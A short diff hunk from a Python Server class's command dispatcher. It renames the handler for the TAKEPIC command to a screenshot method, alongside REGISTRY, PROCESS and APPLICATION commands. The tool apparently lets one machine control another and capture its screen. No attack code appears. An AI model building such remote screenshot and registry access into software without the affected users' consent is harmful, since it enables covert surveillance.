@@ -446,7 +446,7 @@ class Server:
                 elif s == "REGISTRY":
                     self.registry()
                 elif s == "TAKEPIC":
-                    self.takepic()
+                    self.screenshot()
                 elif s == "PROCESS":
                     self.process()
                 elif s == "APPLICATION":
